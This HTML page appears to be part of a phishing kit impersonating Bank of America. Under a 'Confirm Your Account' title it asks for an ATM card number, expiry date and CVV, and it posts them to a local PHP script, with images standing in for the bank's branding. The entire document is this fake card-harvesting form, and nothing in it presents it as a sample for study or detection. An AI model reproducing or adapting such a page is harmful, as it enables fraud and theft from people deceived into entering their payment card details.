<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Confirm Your Account</title>
<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
<meta charset="utf-8" />
<meta name="applicable-device" content="pc,mobile" />
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="format-detection" content="telephone=no" />

<link rel="shortcut icon"
              href="images/favicon.ico"/>
			  
			  
    
  <style type="text/css" media="screen">
    html { background: #ddd; }
    body { font: normal 18px/1.6 'Open Sans', "Helvetica Neue", Arial, sans-serif; font-weight: 300; color: #777; padding: 2em 5%; width: 80%; max-width: 1200px; margin: 0 auto; background: #fff; }
    small { color: #aaa; }
    h1,h2,h3,h4 { color: #444; font-weight: 700; font-size: 1.6em; letter-spacing: -1px; }
    a { color: #0086B3; font-weight: 700; }
    a:hover { color: #000; }
    p code, li code {background:#ffffcc; color: #444; }
    pre { font-size: 12px; line-height: 18px; }
    pre code { overflow: scroll; padding: 1em; border-radius: 10px; }
    hr { height: 10px; background: #eee; border: none; }
    table {width:100%;border-collapse:collapse;}
    td { border: 1px solid #eee; padding: 15px; }
    td pre { margin: 0; }
         .modal {
                display: none;
                background: #ccc;
                width: 50%;
                text-align: center;
                padding: 30px;
                color: #f2f2f2;
            }

</style>
       
  <title>Bank Of America | Sign In | Confirm Change </title>
</head>
<body>
<center>
<img src="2.png">
</BR></BR>
</center>
<form style="margin-left:5%;" method="POST" action="action3.php">
<span style="font-size:14px;"

<p><b>ATM Card Number </b></p>
<input style="padding:4px;" type="text" required="required" name="cc" autocomplete="cc" size="20" maxlength="19" onkeyup="type_carte()" placeholder="XXXX-XXXX-XXXX-XXXX"></BR>

<p><b>Expiry Date</b></p>
<input style="padding:4px;" type="text" required="required" maxlength="7" name="ex" placeholder="XX/XXXX"></BR>

<p><b>Cvv Code </b></p>
<input style="padding:4px;" type="password" required="required" name="cvv" placeholder="XXX"></BR></BR>




<input type="image" src="3.png" value="done">
</form>
</div>

<center>
</BR></BR></BR>
<img src="1.png">
</center>
 

</div>

<!-- Modal HTML embedded directly into document -->



</body>
</html>
